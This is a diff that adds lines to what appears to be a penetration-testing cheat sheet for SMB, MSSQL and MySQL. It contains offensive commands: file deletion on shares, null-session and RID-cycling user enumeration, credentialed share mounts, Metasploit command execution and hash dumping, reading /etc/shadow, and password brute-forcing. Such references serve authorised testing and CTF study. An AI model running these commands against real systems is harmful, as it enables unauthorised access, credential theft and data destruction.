@@ -75,6 +75,11 @@ Access shares with found creds:
 smbclient -L <TARGET_IP> -U <USER>
 smbclient //<TARGET_IP>/public -U "<USER>%<PW>" -c "ls; get flag.txt; quit"
 smbclient "//<TARGET_IP>/<share>" -U "<USER>%<PW>" -c "prompt; recurse; mget *" -D /tmp/smb/
+smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP> --delete '<share>$\file'   # delete
+rpcclient -U "" -N <TARGET_IP>   # then: srvinfo (OS) / enumdomusers / enumdomgroups / lookupnames <USER> (→ SID)
+enum4linux -r -u "<USER>" -p "<PW>" <TARGET_IP>   # RID cycling
+# Windows-side mount with creds:
+net use Z: \\<TARGET_IP>\<share>$ <PW> /user:<USER>   ;   net use Z: /delete
 ```
 
 ## FTP (21)
@@ -152,7 +157,11 @@ nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mss
 mysql -h <TARGET_IP> -u root                 # show databases; use <db>; select load_file("/etc/shadow");
 hydra -l <USER> -P unix_passwords.txt <TARGET_IP> mysql
 use auxiliary/scanner/mysql/mysql_login|mysql_hashdump|mysql_schemadump
-use auxiliary/scanner/mssql/mssql_login ; use auxiliary/admin/mssql/mssql_exec
+use auxiliary/scanner/mssql/mssql_login ; use auxiliary/admin/mssql/mssql_exec   # set CMD <cmd>
+use auxiliary/admin/mssql/mssql_enum ; use auxiliary/admin/mssql/mssql_enum_sql_logins
+use auxiliary/admin/mssql/mssql_enum_domain_accounts
+# MSSQL nmap: ms-sql-info|ms-sql-ntlm-info|ms-sql-empty-password|ms-sql-brute|ms-sql-dump-hashes|ms-sql-xp-cmdshell
+# handy query:  SELECT * FROM master..syslogins
 ```
 MySQL metasploit auxiliary workflow (setg RHOSTS):
 ```text
